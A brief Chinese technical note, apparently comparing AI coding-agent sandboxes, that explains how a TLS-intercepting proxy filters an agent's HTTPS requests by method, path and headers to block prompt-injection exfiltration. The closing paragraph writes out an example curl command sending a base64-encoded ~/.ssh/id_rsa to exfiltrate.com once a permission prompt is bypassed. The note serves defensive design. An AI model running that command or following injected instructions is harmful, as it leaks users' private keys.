真实 TLS 握手

MITM 工作流程（6 步）

  • 子进程发起 HTTPS 请求，被 HTTPS_PROXY 路由到 in-process 代理
  • 代理用动态生成 CA cert（certs.rs）伪造 server cert，与子进程 TLS 握手
  • 代理自己以真实 client 身份与目标域 TLS 握手
  • 解密明文请求，NetworkPolicyDecider 评估域名 + 路径 + HTTP method
  • 允许 → 转发；拒绝 → 返回 403
  • 绕过代理的连接被 Landlock/seccomp 直接 block

为什么不只看 SNI？

  • SNI 只能以域为粒度拒绝
  • MITM 可区分 GET github.com/... vs POST github.com/...
  • prompt-injection 可能让 agent "GET 看似无害 URL"实则带 exfiltration 参数
  • method + path + headers 三维联合判断才能防住这类攻击
  • 代价：cert 生命周期管理（certs.rs 负责注入与清理）

Claude Code 无此层：直接 spawn curl / fetch，无代理，无过滤，无 MITM。若 LLM 被 injection 驱动执行 curl https://exfiltrate.com?data=$(cat ~/.ssh/id_rsa | base64)，permission prompt 被绕过后没有第二道防线。
